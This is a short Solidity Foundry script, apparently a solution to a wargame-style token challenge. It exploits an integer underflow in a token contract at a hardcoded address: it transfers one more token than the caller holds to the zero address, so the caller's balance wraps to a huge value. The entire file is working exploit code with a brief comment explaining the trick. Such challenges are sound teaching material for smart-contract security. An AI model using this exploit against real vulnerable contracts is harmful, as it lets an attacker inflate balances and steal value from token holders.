// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface Token {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external returns (uint256);
}

contract AttackToken is Script {
    // The idea here is that the Token contract is vulnerable to uint overflow/underflow.
    // So we just need to request to transfer 1 token more than the balance.
    function run() public returns (uint256) {
        Token token = Token(address(0x5E7F33A2888493da530048DB4a040195d0D1dd6e));
        uint256 balanceBefore = token.balanceOf(msg.sender);

        uint256 toSend = balanceBefore < type(uint256).max ? balanceBefore + 1 : balanceBefore;
        vm.broadcast();
        token.transfer(address(0x0), toSend);

        uint256 newBalance = token.balanceOf(msg.sender);
        return newBalance;
    }
}
